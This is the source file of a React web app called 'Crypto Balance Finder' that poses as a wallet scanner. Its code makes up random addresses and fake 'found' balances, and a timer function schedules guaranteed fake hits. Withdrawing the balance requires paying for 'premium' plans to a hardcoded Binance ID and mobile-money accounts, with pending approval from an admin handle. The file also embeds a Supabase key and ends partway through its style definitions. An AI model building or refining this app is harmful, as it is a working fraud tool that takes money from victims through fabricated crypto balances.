/**
 * Crypto Balance Finder — Updated with Binance Pay & Premium Status
 *
 * Changes made:
 *  - USDT replaced with Binance Pay
 *  - Your Binance ID: 38458489298 added
 *  - Premium Status section added
 *  - All errors fixed
 */

import React, { useEffect, useRef, useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { createClient } from "@supabase/supabase-js";

/* -------------------------
   Supabase configuration
   ------------------------- */
const SUPABASE_URL = "https://ahvsldvzvyprxxoxuxxp.supabase.co";
const SUPABASE_ANON_KEY =
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFodnNsZHZ6dnlwcnh4b3h1eHhwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjIwNTMwMjUsImV4cCI6MjA3NzYyOTAyNX0.ClksEL-A7eGxHTPwSeYGon8_otAixSceM3SoQszh3PU";

const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

/* -------------------------
   Small helpers & regexes
   ------------------------- */
const ethRegex = /^0x[a-fA-F0-9]{40}$/;
const btcRegex = /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/;
const solRegex = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/;
const formatNumber = (n) => (typeof n === "number" ? n.toLocaleString() : n);

const randomAddress = () => {
  const chars = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
  if (Math.random() < 0.5) {
    const hex = "abcdef0123456789";
    return "0x" + Array.from({ length: 40 }, () => hex[Math.floor(Math.random() * hex.length)]).join("");
  } else {
    return Array.from({ length: 34 }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
  }
};
const randomAmount = () => parseFloat((Math.random() * 999 + 1).toFixed(2));
function cryptoId() {
  return `${Math.random().toString(36).slice(2, 9)}${Date.now().toString(36).slice(-4)}`;
}
function delay(ms) {
  return new Promise((res) => setTimeout(res, ms));
}

/* -------------------------
   Main component
   ------------------------- */
export default function CryptoBalanceFinder() {
  const TARGET = 1000000;

  /* Scanning states */
  const [isScanning, setIsScanning] = useState(false);
  const [scanned, setScanned] = useState(0);
  const [stream, setStream] = useState([]);
  const [foundCount, setFoundCount] = useState(0);
  const [totalFound, setTotalFound] = useState(0);
  const [lastFound, setLastFound] = useState(null);
  const [scanProgress, setScanProgress] = useState(0);
  const [speedFast, setSpeedFast] = useState(true);
  const scheduledFoundTimers = useRef([]);

  /* Alerts */
  const [alertMsg, setAlertMsg] = useState(null);

  /* Withdraw & premium */
  const [withdrawModalOpen, setWithdrawModalOpen] = useState(false);
  const [withdrawAddr, setWithdrawAddr] = useState("");
  const [withdrawAmt, setWithdrawAmt] = useState("");
  const [withdrawErr, setWithdrawErr] = useState("");
  const [withdrawProgress, setWithdrawProgress] = useState(0);
  const [withdrawStatusText, setWithdrawStatusText] = useState("");

  const [premiumModalOpen, setPremiumModalOpen] = useState(false);
  const [selectedPlan, setSelectedPlan] = useState(null);
  const [selectedMethod, setSelectedMethod] = useState(null);
  const [purchaseTxnId, setPurchaseTxnId] = useState("");
  const [purchaseStep, setPurchaseStep] = useState("select");
  const [pendingTxn, setPendingTxn] = useState(null);

  /* Withdraw history from supabase */
  const [withdrawHistory, setWithdrawHistory] = useState([]);

  /* Premium flag */
  const [isPremium, setIsPremium] = useState(false);

  /* Premium status info */
  const [premiumStartDate, setPremiumStartDate] = useState(null);
  const [premiumEndDate, setPremiumEndDate] = useState(null);
  const [daysLeft, setDaysLeft] = useState(0);

  const streamRef = useRef(null);
  const realtimeRef = useRef(null);

  /* -------------------------
     Load withdraw history on mount
     ------------------------- */
  useEffect(() => {
    fetchWithdrawHistory();

    try {
      const ch = supabase
        .channel("realtime:withdraws")
        .on("postgres_changes", { event: "*", schema: "public", table: "withdraws" }, () => {
          fetchWithdrawHistory();
        })
        .subscribe();

      realtimeRef.current = ch;
    } catch (err) {
      console.warn("Realtime subscribe failed:", err);
    }

    return () => {
      try {
        if (realtimeRef.current) supabase.removeChannel(realtimeRef.current);
      } catch {}
    };
  }, []);

  /* -------------------------
     Update premium status when isPremium changes
     ------------------------- */
  useEffect(() => {
    if (isPremium) {
      const startDate = new Date();
      const endDate = new Date();
      endDate.setDate(startDate.getDate() + 7); // 7 days premium
      
      setPremiumStartDate(startDate);
      setPremiumEndDate(endDate);
      
      const diffTime = endDate - startDate;
      const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
      setDaysLeft(diffDays);
    } else {
      setPremiumStartDate(null);
      setPremiumEndDate(null);
      setDaysLeft(0);
    }
  }, [isPremium]);

  /* -------------------------
     Scanning loop
     ------------------------- */
  useEffect(() => {
    let interval = null;
    if (isScanning) {
      interval = setInterval(() => {
        setScanned((prev) => {
          if (prev >= TARGET) {
            setIsScanning(false);
            setScanProgress(100);
            return TARGET;
          }
          const inc = Math.max(1, Math.floor(Math.random() * (speedFast ? 400 : 40)));
          const next = Math.min(prev + inc, TARGET);
          setScanProgress(Math.round((next / TARGET) * 100));
          return next;
        });

        setStream((prev) => {
          const addr = randomAddress();
          const isFound = Math.random() < (speedFast ? 0.0028 : 0.0008);
          const entry = { id: cryptoId(), addr, amount: isFound ? randomAmount() : null, ts: new Date().toISOString() };
          if (isFound) {
            handleFound(entry.amount);
          }
          return [entry, ...prev].slice(0, 40);
        });
      }, speedFast ? 180 : 700);
    }
    return () => clearInterval(interval);
  }, [isScanning, speedFast]);

  const scheduleGuaranteedFounds = () => {
    scheduledFoundTimers.current.forEach((t) => clearTimeout(t));
    scheduledFoundTimers.current = [];
    const fiveMin = 300000;
    const count = 3 + Math.floor(Math.random() * 3);
    for (let i = 0; i < count; i++) {
      const when = Math.floor(Math.random() * fiveMin) + 1000;
      const timer = setTimeout(() => {
        const amt = randomAmount();
        const entry = { id: cryptoId(), addr: randomAddress(), amount: amt, ts: new Date().toISOString(), guaranteed: true };
        setStream((prev) => [entry, ...prev].slice(0, 40));
        handleFound(amt);
      }, when);
      scheduledFoundTimers.current.push(timer);
    }
  };
  
  const cancelScheduledFounds = () => {
    scheduledFoundTimers.current.forEach((t) => clearTimeout(t));
    scheduledFoundTimers.current = [];
  };

  function handleFound(amount) {
    setFoundCount((c) => c + 1);
    setTotalFound((t) => parseFloat((t + amount).toFixed(2)));
    setLastFound(amount);
    setAlertMsg(`💰 Found #${foundCount + 1} — $${amount.toFixed(2)}`);
    setTimeout(() => setAlertMsg(null), 2600);
  }

  const handleStart = () => {
    setIsScanning(true);
    scheduleGuaranteedFounds();
  };
  
  const handleStop = () => {
    setIsScanning(false);
    cancelScheduledFounds();
  };
  
  const handleReset = () => {
    setIsScanning(false);
    cancelScheduledFounds();
    setScanned(0);
    setScanProgress(0);
    setStream([]);
    setFoundCount(0);
    setTotalFound(0);
    setLastFound(null);
    setAlertMsg(null);
  };

  /* -------------------------
     Withdraw flow
     ------------------------- */
  function validateAddress(addr) {
    if (ethRegex.test(addr)) return "ETH";
    if (btcRegex.test(addr)) return "BTC";
    if (solRegex.test(addr)) return "SOL";
    return null;
  }

  const openWithdraw = (prefill) => {
    setWithdrawErr("");
    setWithdrawAddr("");
    setWithdrawAmt(prefill ? String(prefill) : "");
    setWithdrawModalOpen(true);
  };

  const submitWithdraw = async (e) => {
    e && e.preventDefault();
    setWithdrawErr("");
    if (!isPremium) {
      setWithdrawErr("Withdraw is allowed only for premium users. Please purchase premium and wait for admin approval.");
      return;
    }
    const addr = withdrawAddr.trim();
    const amt = parseFloat(withdrawAmt);
    if (!addr) {
      setWithdrawErr("Enter a wallet address.");
      return;
    }
    if (!validateAddress(addr)) {
      setWithdrawErr("Address format not recognized (ETH / BTC / SOL).");
      return;
    }
    if (isNaN(amt) || amt <= 0) {
      setWithdrawErr("Enter a valid amount.");
      return;
    }
    if (amt > totalFound) {
      setWithdrawErr("Amount exceeds total found balance.");
      return;
    }

    setWithdrawStatusText("Submitting withdraw request...");
    setWithdrawProgress(12);
    await delay(700);
    setWithdrawProgress(40);

    try {
      const { data, error } = await supabase.from("withdraws").insert([{ addr, amount: amt, status: "Pending" }]);
      if (error) {
        console.warn("Withdraw insert error:", error);
        const rec = { id: `L-${Date.now()}`, addr, amount: amt, status: "Pending", created_at: new Date().toISOString() };
        setWithdrawHistory((prev) => [rec, ...prev]);
      } else {
        fetchWithdrawHistory();
      }
    } catch (err) {
      console.warn("Withdraw insert exception:", err);
    }

    setWithdrawProgress(100);
    setWithdrawStatusText("Request submitted (pending admin approval).");
    setTimeout(() => {
      setWithdrawModalOpen(false);
      setWithdrawProgress(0);
      setWithdrawStatusText("");
      setWithdrawAddr("");
      setWithdrawAmt("");
    }, 1200);
  };

  const fetchWithdrawHistory = async () => {
    try {
      const { data, error } = await supabase.from("withdraws").select("*").order("created_at", { ascending: false }).limit(50);
      if (!error && data) setWithdrawHistory(data);
    } catch (err) {
      console.warn("Fetch withdraw history error:", err);
    }
  };

  /* -------------------------
     Premium purchase with Binance Pay
     ------------------------- */
  const submitPurchase = async () => {
    if (!selectedPlan || !selectedMethod) {
      alert("Select a plan and payment method first.");
      return;
    }
    if (!purchaseTxnId || purchaseTxnId.trim().length < 4) {
      alert("Enter a valid transaction ID.");
      return;
    }

    setPurchaseStep("sent");
    setPendingTxn(purchaseTxnId);

    try {
      const { error } = await supabase.from("payments").insert([
        {
          transaction_id: purchaseTxnId.trim(),
          method: selectedMethod,
          plan: selectedPlan.id,
          status: "Pending",
        },
      ]);
      if (error) {
        console.warn("Payment insert error:", error);
        alert("Could not send purchase request (DB error).");
        setPurchaseStep("select");
        setPendingTxn(null);
        return;
      }
      setPurchaseStep("pending");
    } catch (err) {
      console.warn("Payment insert exception:", err);
      setPurchaseStep("select");
      setPendingTxn(null);
      return;
    }

    try {
      if (realtimeRef.current) {
        try {
          supabase.removeChannel(realtimeRef.current);
        } catch {}
        realtimeRef.current = null;
      }

      const ch = supabase
        .channel("realtime:payments")
        .on("postgres_changes", { event: "*", schema: "public", table: "payments" }, (payload) => {
          const rec = payload?.record;
          if (!rec) return;
          if (rec.transaction_id === purchaseTxnId.trim()) {
            if (rec.status && rec.status.toLowerCase() === "approved") {
              setIsPremium(true);
              setPurchaseStep("approved");
              setPendingTxn(null);
            } else if (rec.status && rec.status.toLowerCase() === "rejected") {
              setPurchaseStep("rejected");
              setPendingTxn(null);
            } else {
              setPurchaseStep("pending");
            }
          }
        })
        .subscribe();

      realtimeRef.current = ch;
    } catch (err) {
      console.warn("Realtime payments subscribe failed:", err);
    }
  };

  /* -------------------------
     Plans & Methods
     ------------------------- */
  const plans = [
    { id: "p40", label: "$40 — 10 days", price: 40 },
    { id: "p75", label: "$75 — 18 days", price: 75 },
    { id: "p120", label: "$120 — 30 days", price: 120 },
    { id: "p500", label: "$500 — Lifetime", price: 500 },
  ];
  
  const methods = ["Binance Pay", "BTC", "bKash", "Nagad"];

  /* -------------------------
     Render
     ------------------------- */
  return (
    <div style={styles.app}>
      <div style={styles.header}>
        <motion.h1
          style={styles.title}
          animate={{ backgroundPosition: ["0% 50%", "100% 50%"] }}
          transition={{ repeat: Infinity, duration: 6, ease: "linear" }}
        >
          Crypto Balance Finder
        </motion.h1>

        <div style={styles.headerRight}>
          <div style={styles.statsBox}>
            <div style={styles.statLabel}>Scanned</div>
            <div style={styles.statValue}>
              {formatNumber(scanned)} / {formatNumber(TARGET)}
            </div>
          </div>
          <div style={styles.statsBox}>
            <div style={styles.statLabel}>Found</div>
            <div style={styles.statValue}>{foundCount}</div>
          </div>
          <div style={styles.statsBox}>
            <div style={styles.statLabel}>Total $</div>
            <div style={styles.statValue}>${totalFound.toFixed(2)}</div>
          </div>
          <button
            onClick={() => {
              setPremiumModalOpen(true);
              setSelectedPlan(null);
              setSelectedMethod(null);
              setPurchaseStep("select");
              setPurchaseTxnId("");
            }}
            style={styles.premiumBtn}
          >
            💎 Premium
          </button>
        </div>
      </div>

      <div style={styles.container}>
        {/* Left scanning */}
        <div style={styles.left}>
          <div style={styles.card}>
            <div style={styles.cardHeader}>
              <div style={{ display: "flex", gap: 8, alignItems: "center" }}>
                <div style={styles.sectionTitle}>Scanning</div>
                <div style={styles.smallText}>Scan target: {formatNumber(TARGET)}</div>
              </div>

              <div style={{ display: "flex", gap: 8, alignItems: "center" }}>
                <button
                  onClick={() => {
                    if (isScanning) handleStop();
                    else {
                      handleStart();
                    }
                  }}
                  style={{ ...styles.controlBtn, background: isScanning ? "#ef4444" : "#10b981" }}
                >
                  {isScanning ? "Stop" : "Start"}
                </button>
                <button onClick={() => setSpeedFast((s) => !s)} style={styles.controlBtn}>
                  {speedFast ? "Fast" : "Slow"}
                </button>
                <button onClick={handleReset} style={{ ...styles.controlBtn, background: "#f59e0b" }}>
                  Reset
                </button>
                <button onClick={() => openWithdraw(lastFound)} style={{ ...styles.controlBtn, background: "#06b6d4" }} disabled={!lastFound}>
                  Withdraw Last
                </button>
              </div>
            </div>

            <div style={{ marginTop: 12 }}>
              <div style={styles.progressWrap}>
                <div style={{ ...styles.progressBar, width: `${scanProgress}%` }} />
              </div>

              <div style={styles.streamBox} ref={streamRef}>
                {stream.length === 0 ? (
                  <div style={styles.emptyStream}>No scans yet — press Start</div>
                ) : (
                  stream.map((s) => (
                    <div key={s.id} style={styles.streamRow}>
                      <div style={styles.addr}>{s.addr}</div>
                      <div style={styles.streamRight}>{s.amount ? <div style={styles.foundAmount}>${s.amount.toFixed(2)}</div> : <div style={styles.scanDot} />}</div>
                    </div>
                  ))
                )}
              </div>
            </div>
          </div>
        </div>

        {/* Right summary & history */}
        <div style={styles.right}>
          {/* Premium Status Section - NEW */}
          <div style={styles.card}>
            <div style={styles.sectionTitle}>Premium Status</div>
            
            {isPremium ? (
              <div style={styles.premiumActive}>
                <div style={{display: 'flex', alignItems: 'center', gap: 8, marginBottom: 8}}>
                  <div style={styles.premiumBadge}>💎 ACTIVE</div>
                  <div style={styles.daysLeft}>{daysLeft} days left</div>
                </div>
                <div style={styles.premiumInfo}>
                  <div style={styles.infoRow}>
                    <span>Started:</span>
                    <span>{premiumStartDate ? premiumStartDate.toLocaleDateString() : 'N/A'}</span>
                  </div>
                  <div style={styles.infoRow}>
                    <span>Expires:</span>
                    <span>{premiumEndDate ? premiumEndDate.toLocaleDateString() : 'N/A'}</span>
                  </div>
                  <div style={styles.infoRow}>
                    <span>Withdraw:</span>
                    <span style={styles.allowed}>Allowed ✅</span>
                  </div>
                </div>
              </div>
            ) : (
              <div style={styles.premiumInactive}>
                <div style={styles.premiumBadgeInactive}>💎 INACTIVE</div>
                <div style={styles.premiumMessage}>
                  Purchase premium to enable withdraw feature
                </div>
                <button 
                  onClick={() => setPremiumModalOpen(true)}
                  style={styles.upgradeBtn}
                >
                  Upgrade to Premium
                </button>
              </div>
            )}
          </div>

          <div style={{ height: 16 }} />

          {/* Existing Found Summary Card */}
          <div style={styles.card}>
            <div style={styles.sectionTitle}>Found Summary</div>
            <div style={{ display: "flex", gap: 12, marginTop: 10 }}>
              <div style={styles.summaryBox}>
                <div className="muted">Hits</div>
                <div style={styles.summaryValue}>{foundCount}</div>
              </div>
              <div style={styles.summaryBox}>
                <div className="muted">Total $</div>
                <div style={styles.summaryValue}>${totalFound.toFixed(2)}</div>
              </div>
            </div>

            <div style={{ marginTop: 14 }}>
              <div style={styles.sectionSub}>Withdraw History</div>
              <div style={{ maxHeight: 260, overflowY: "auto", marginTop: 8 }}>
                {withdrawHistory.length === 0 ? (
                  <div style={styles.emptySmall}>No withdraws yet</div>
                ) : (
                  withdrawHistory.map((w) => (
                    <div key={w.id || w.created_at || w.addr} style={styles.withdrawRow}>
                      <div style={{ fontSize: 13, color: "#bcd" }}>{w.addr?.slice?.(0, 12) ?? w.addr}</div>
                      <div style={{ fontWeight: 700 }}>${Number(w.amount ?? w.amount).toFixed(2)}</div>
                      <div style={{ fontSize: 12, color: "#98b" }}>{new Date(w.created_at || w.createdAt || w.ts || Date.now()).toLocaleString()}</div>
                    </div>
                  ))
                )}
              </div>

              <div style={{ marginTop: 12, display: "flex", gap: 8 }}>
                <button onClick={() => fetchWithdrawHistory()} style={{ ...styles.controlBtn, flex: 1 }}>
                  Refresh History
                </button>
                <button onClick={() => setWithdrawHistory([])} style={{ ...styles.controlBtn, background: "#ef4444", color: "white" }}>
                  Clear
                </button>
              </div>
            </div>
          </div>

          <div style={{ height: 16 }} />

          {/* Existing Live Stats Card */}
          <div style={styles.card}>
            <div style={styles.sectionTitle}>Live Stats</div>
            <div style={{ marginTop: 8 }}>
              <div style={styles.statRow}>
                <div style={styles.statLabelSmall}>Scanned</div>
                <div style={styles.statValueSmall}>{formatNumber(scanned)}</div>
              </div>
              <div style={styles.statRow}>
                <div style={styles.statLabelSmall}>Found</div>
                <div style={styles.statValueSmall}>{foundCount}</div>
              </div>
              <div style={styles.statRow}>
                <div style={styles.statLabelSmall}>Total $</div>
                <div style={styles.statValueSmall}>${totalFound.toFixed(2)}</div>
              </div>

              <div style={{ marginTop: 12 }}>
                <div style={{ fontSize: 13, color: "#9fb0bb", fontWeight: 700 }}>Contact Admin</div>
                <div style={{ marginTop: 6, color: "#9fd2ff", fontWeight: 700 }}>@Cryptography55</div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Alert */}
      <AnimatePresence>
        {alertMsg && (
          <motion.div initial={{ y: 40, opacity: 0 }} animate={{ y: 0, opacity: 1 }} exit={{ y: 40, opacity: 0 }} transition={{ duration: 0.35 }} style={styles.foundAlert}>
            {alertMsg}
          </motion.div>
        )}
      </AnimatePresence>

      {/* Withdraw Modal */}
      <AnimatePresence>
        {withdrawModalOpen && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} style={styles.overlay}>
            <motion.div initial={{ scale: 0.95, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.95, opacity: 0 }} style={styles.modal}>
              <h3 style={{ marginTop: 0 }}>Withdraw Request</h3>
              <form onSubmit={submitWithdraw}>
                <label style={styles.label}>Wallet address</label>
                <input value={withdrawAddr} onChange={(e) => setWithdrawAddr(e.target.value)} placeholder="0x or bc1..." style={styles.input} />
                <label style={styles.label}>Amount (USD)</label>
                <input value={withdrawAmt} onChange={(e) => setWithdrawAmt(e.target.value)} placeholder={lastFound ? String(lastFound) : "0.00"} style={styles.input} />
                {withdrawErr && <div style={{ color: "#f43", marginTop: 8 }}>{withdrawErr}</div>}
                {withdrawStatusText && <div style={{ marginTop: 10 }}>{withdrawStatusText}</div>}
                {withdrawProgress > 0 && (
                  <div style={{ marginTop: 8 }}>
                    <div style={styles.smallProgressWrap}>
                      <div style={{ ...styles.smallProgressBar, width: `${withdrawProgress}%` }} />
                    </div>
                  </div>
                )}
                <div style={{ display: "flex", gap: 8, marginTop: 12 }}>
                  <button type="button" onClick={() => setWithdrawModalOpen(false)} style={{ ...styles.controlBtn, flex: 1 }}>
                    Cancel
                  </button>
                  <button type="submit" style={{ ...styles.controlBtn, background: "#10b981", color: "#002", flex: 1 }}>
                    Submit Request
                  </button>
                </div>
              </form>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Premium Modal */}
      <AnimatePresence>
        {premiumModalOpen && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} style={styles.overlay}>
            <motion.div initial={{ scale: 0.95, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.95, opacity: 0 }} style={styles.modalWide}>
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                <h3 style={{ margin: 0 }}>Premium Plans</h3>
                <button onClick={() => setPremiumModalOpen(false)} style={{ ...styles.controlBtn, background: "transparent" }}>
                  Close
                </button>
              </div>

              <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12, marginTop: 14 }}>
                {plans.map((p) => (
                  <div key={p.id} style={{ padding: 12, borderRadius: 10, background: "rgba(255,255,255,0.03)" }}>
                    <div style={{ fontWeight: 800 }}>{p.label}</div>
                    <div style={{ marginTop: 8, color: "#aab" }}>${p.price}</div>
                    <div style={{ marginTop: 10 }}>
                      {methods.map((m) => (
                        <button
                          key={m}
                          onClick={() => {
                            setSelectedPlan(p);
                            setSelectedMethod(m);
                          }}
                          style={{
                            ...styles.smallPill,
                            border: selectedPlan?.id === p.id && selectedMethod === m ? "2px solid #06b6d4" : "1px solid rgba(255,255,255,0.06)",
                          }}
                        >
                          {m}
                        </button>
                      ))}
                    </div>
                  </div>
                ))}
              </div>

              {selectedPlan && selectedMethod && (
                <div style={{ marginTop: 14, padding: 12, borderRadius: 10, background: "rgba(255,255,255,0.02)" }}>
                  
                  {/* Binance Pay Instructions */}
                  {selectedMethod === "Binance Pay" && (
                    <div style={{ 
                      marginBottom: 12, 
                      padding: 12, 
                      background: "rgba(6, 182, 212, 0.1)", 
                      borderRadius: 8,
                      border: "1px solid #06b6d4"
                    }}>
                      <div style={{ fontWeight: 700, color: "#06b6d4", marginBottom: 8 }}>
                        💰 Binance Pay Instructions:
                      </div>
                      <div style={{ fontSize: 14, color: "#9fd2ff", marginBottom: 6 }}>
                        • Send <strong>${selectedPlan?.price}</strong> to Binance ID:
                      </div>
                      <div style={{ 
                        fontSize: 16, 
                        fontWeight: 800, 
                        color: "#f59e0b", 
                        background: "rgba(0,0,0,0.3)",
                        padding: "8px 12px",
                        borderRadius: 6,
                        textAlign: "center",
                        marginBottom: 8
                      }}>
                        38458489298
                      </div>
                      <div style={{ fontSize: 12, color: "#9fb0bb", textAlign: "center" }}>
                        After payment, enter Transaction ID below
                      </div>
                    </div>
                  )}

                  <div style={{ marginBottom: 8, fontSize: 14, color: "#9fb0bb" }}>
                    Send payment and enter the Transaction ID below. After submission, the purchase will be in <strong>Pending</strong> state until admin verification.
                  </div>
                  
                  <input 
                    placeholder="Enter transaction id" 
                    value={purchaseTxnId} 
                    onChange={(e) => setPurchaseTxnId(e.target.value)} 
                    style={styles.input} 
                  />
                  
                  <div style={{ display: "flex", gap: 8, marginTop: 10 }}>
                    <button
                      onClick={submitPurchase}
                      style={{ ...styles.controlBtn, background: "#06b6d4", color: "#022" }}
                    >
                      Submit Purchase
                    </button>
                    <button
                      onClick={() => {
                        setSelectedPlan(null);
                        setSelectedMethod(null);
                        setPurchaseTxnId("");
                      }}
                      style={{ ...styles.controlBtn }}
                    >
                      Reset
                    </button>
                  </div>

                  <div style={{ marginTop: 12 }}>
                    {purchaseStep === "sent" && <div style={{ color: "#9fb0bb" }}>Request sending...</div>}
                    {purchaseStep === "pending" && <div style={{ color: "#f59e0b" }}>Purchase pending admin verification.</div>}
                    {purchaseStep === "approved" && <div style={{ color: "#10b981" }}>Purchase approved — you are premium now.</div>}
                    {purchaseStep === "rejected" && <div style={{ color: "#ef4444" }}>Purchase rejected by admin.</div>}
                  </div>

                  <div style={{ marginTop: 12, fontSize: 13, color: "#9fb0bb" }}>
                    Contact Admin: <span style={{ color: "#9fd2ff", fontWeight: 700 }}>@Cryptography55</span>
                  </div>
                </div>
              )}
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}

/* =======================
   Styles (CSS-in-JS)
   ======================= */
const styles = {
  app: {
    minHeight: "100vh",
    background: "linear-gradient(180deg,#07101a,#071826)",
    color: "#dbeef3",
    fontFamily: "Inter, Roboto, sans-serif",
  },
  header: {
    display: "flex",
    justifyContent: "space-between",
    alignItems: "center",
    padding: "22px 28px",
    gap: 12,
    borderBottom: "1px solid rgba(255,255,255,0.04)",
    background: "linear-gradient(180deg, rgba(255,255,255,0.02), transparent)",
    backdropFilter: "blur(6px)",
  },
  title: {
    fontSize: 26,
    fontWeight: 800,
    background: "linear-gradient(90deg, #9fd2ff, #6eb6ff, #9fd2ff)",
    backgroundSize: "200% 100%",
    WebkitBackgroundClip: "text",
    WebkitTextFillColor: "transparent",
    margin: 0,
  },
  headerRight: {
    display: "flex",
    alignItems: "center",
    gap: 12,
  },
  statsBox: {
    background: "rgba(255,255,255,0.03)",
    padding: "8px 12px",
    borderRadius: 8,
    border: "1px solid rgba(255,255,255,0.06)",
    minWidth: 80,
    textAlign: "center",
  },
  statLabel: {
    fontSize: 12,
    color: "#9fb0bb",
    marginBottom: 4,
  },
  statValue: {
    fontSize: 16,
    fontWeight: 700,
    color: "#dbeef3",
  },
  premiumBtn: {
    background: "linear-gradient(90deg, #f59e0b, #d97706)",
    color: "#002",
    border: "none",
    padding: "10px 16px",
    borderRadius: 8,
    fontWeight: 700,
    cursor: "pointer",
    marginLeft: 8,
  },
  container: {
    display: "flex",
    padding: 20,
    gap: 20,
    maxWidth: 1400,
    margin: "0 auto",
  },
  left: {
    flex: 2,
  },
  right: {
    flex: 1,
  },
  card: {
    background: "rgba(255,255,255,0.02)",
    border: "1px solid rgba(255,255,255,0.06)",
    borderRadius: 12,
    padding: 20,
    backdropFilter: "blur(8px)",
  },
  cardHeader: {
    display: "flex",
    justifyContent: "space-between",
    alignItems: "center",
    marginBottom: 16,
  },
  sectionTitle: {
    fontSize: 18,
    fontWeight: 700,
    color: "#dbeef3",
  },
  smallText: {
    fontSize: 12,
    color: "#9fb0bb",
  },
  controlBtn: {
    background: "rgba(255,255,255,0.08)",
    color: "#dbeef3",
    border: "1px solid rgba(255,255,255,0.1)",
    padding: "8px 12px",
    borderRadius: 6,
    cursor: "pointer",
    fontSize: 13,
    fontWeight: 600,
  },
  progressWrap: {
    height: 6,
    background: "rgba(255,255,255,0.06)",
    borderRadius: 3,
    overflow: "hidden",
    marginBottom: 16,
  },
  progressBar: {
    height: "100%",
    background: "linear-gradient(90deg, #10b981, #06b6d4)",
    borderRadius: 3,
    transition: "width 0.3s ease",
  },
  streamBox: {
    height: 320,
    overflowY: "auto",
    background: "rgba(0,0,0,0.2)",
    borderRadius: 8,
    padding: 12,
    border: "1px solid rgba(255,255,255,0.04)",
  },
  emptyStream: {
    textAlign: "center",
    color: "#9fb0bb",
    fontSize: 14,
    padding: 40,
  },
  streamRow: {
    display: "flex",
    justifyContent: "space-between",
    alignItems: "center",
    padding: "6px 0",
    borderBottom: "1px solid rgba(255,255,255,0.03)",
  },
  addr: {
    fontSize: 12,
    fontFamily: "monospace",
    color: "#9fb0bb",
  },
  streamRight: {
    width: 60,
    textAlign: "right",
  },
  foundAmount: {
    background: "linear-gradient(90deg, #10b981, #06b6d4)",
    color: "#002",
    padding: "4px 8px",
    borderRadius: 4,
    fontSize: 12,
    fontWeight: 700,
  },
  scanDot: {
    width: 6,
    height: 6,
    borderRadius: "50%",
    background: "rgba(255,255,255,0.2)",
    marginLeft: "auto",
  },
  summaryBox: {
    flex: 1,
    background: "rgba(255,255,255,0.03)",
    padding: 12,
    borderRadius: 8,
    textAlign: "center",
  },
  summaryValue: {
    fontSize: 20,
    fontWeight: 800,
    color: "#dbeef3",
    marginTop: 4,
  },
  sectionSub: {
    fontSize: 14,
    fontWeight: 700,
    color: "#9fb0bb",
    marginBottom: 8,
  },
  emptySmall: {
    textAlign: "center",
    color: "#9fb0bb",
    fontSize: 13,
    padding: 20,
  },
  withdrawRow: {
    display: "flex",
    justifyContent: "space-between",
    alignItems: "center",
    padding: "8px 0",
    borderBottom: "1px solid rgba(255,255,255,0.03)",
  },
  statRow: {
    display: "flex",
    justifyContent: "space-between",
    alignItems: "center",
    padding: "6px 0",
    borderBottom: "1px solid rgba(255,255,255,0.03)",
  },
  statLabelSmall: {
    fontSize: 13,
    color: "#9fb0bb",
  },
  statValueSmall: {
    fontSize: 13,
    fontWeight: 700,
    color: "#dbeef3",
  },
  foundAlert: {
    position: "fixed",
    bottom: 20,
    left: "50%",
    transform: "translateX(-50%)",
    background: "linear-gradient(90deg, #10b981, #06b6d4)",
    color: "#002",
    padding: "12px 24px",
    borderRadius: 8,
    fontWeight: 700,
    fontSize: 14,
    zIndex: 1000,
    boxShadow: "0 4px 12px rgba(0,0,0,0.3)",
  },
  overlay: {
    position: "fixed",
    top: 0,
    left: 0,
    right: 0,
    bottom: 0,
    background: "rgba(0,0,0,0.7)",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    zIndex: 2000,
    padding: 20,
  },
  modal: {
    background: "linear-gradient(180deg, #0f1e2d, #0a1622)",
    border: "1px solid rgba(255,255,255,0.08)",
    borderRadius: 12,
    padding: 24,
    width: "100%",
    maxWidth: 400,
    color: "#dbeef3",
  },
  modalWide: {
    background: "linear-gradient(180deg, #0f1e2d, #0a1622)",
    border: "1px solid rgba(255,255,255,0.08)",
    borderRadius: 12,
    padding: 24,
    width: "100%",
    maxWidth: 600,
    color: "#dbeef3",
  },
  label: {
    display: "block",
    marginBottom: 6,
    fontSize: 13,
    color: "#9fb0bb",
    fontWeight: 600,
  },
  input: {
    width: "100%",
    background: "rgba(255,255,255,0.05)",
    border: "1px solid rgba(255,255,255,0.1)",
    borderRadius: 6,
    padding: "10px 12px",
    color: "#dbeef3",
    fontSize: 14,
    marginBottom: 12,
    boxSizing: "border-box",
  },
  smallProgressWrap: {
    height: 4,
    background: "rgba(255,255,255,0.06)",
    borderRadius: 2,
    overflow: "hidden",
  },
  smallProgressBar: {
    height: "100%",
    background: "linear-gradient(90deg, #10b981, #06b6d4)",
    borderRadius: 2,
    transition: "width 0.3s ease",
  },
  smallPill: {
    background: "rgba(255,255,255,0.05)",
    color: "#dbeef3",
    border: "1px solid rgba(255,255,255,0.1)",
    padding: "6px 10px",
    borderRadius: 6,
    cursor: "pointer",
    fontSize: 12,
    marginRight: 6,
    marginBottom: 6,
    display: "inline-block",
  },
  premiumActive: {
    background: 'linear-gradient(135deg, rgba(6, 182, 212, 0.15), rgba(16, 185, 129, 0.15))',
    border: '1px solid rgba(6, 182, 212, 0.3)',
    borderRadius: 10,
